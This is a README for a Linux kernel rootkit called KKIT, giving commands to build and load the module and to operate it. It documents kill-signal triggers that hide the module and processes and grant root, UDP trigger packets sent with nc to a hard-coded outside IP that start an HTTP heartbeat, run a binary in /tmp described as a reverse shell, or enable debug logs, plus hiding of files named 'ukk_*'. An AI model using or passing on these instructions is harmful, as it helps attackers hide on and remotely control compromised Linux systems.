# KKIT
A Linux Kernel RootKit

## Install
```shell
make

insmod kkit.ko
```

## USE
### hide/show the module:
```shell
kill -62 0
```
### hide/show process:
```shell
kill -60 pid
```
### getroot:
```shell
kill -61 0
```
### heartbeat
Trigger to send a http request:
```shell
# Server:
nc -p 1338 120.46.219.162 50005 -u
fdsfasd
```
If the kkit received a udp packet sended from 1338 port to 50005 port, the kkit will send a http packet to the targeted server ip
```shell
#server:
python3 -m http.server 50002
```
### exec_cmd

```shell
#Server
nc -p 1339 120.46.219.162 50005 -u
fsdfsdaf
```
If the kkit received a udp packet sended from 1339 port to 50005 port, the kkit will exexcve /tmp/ukk_tc
If the ukk_tc is a binary will establish reverse tcp connection, the kkit can establish reverse tcp connection

### debug_mode
If want to see the running debug log:
```shell
#Server
nc -p 1340 120.46.219.162 50005 -u
fsdfsdaf
```

### hide file
If the filename is "ukk_*", the file will be hided.

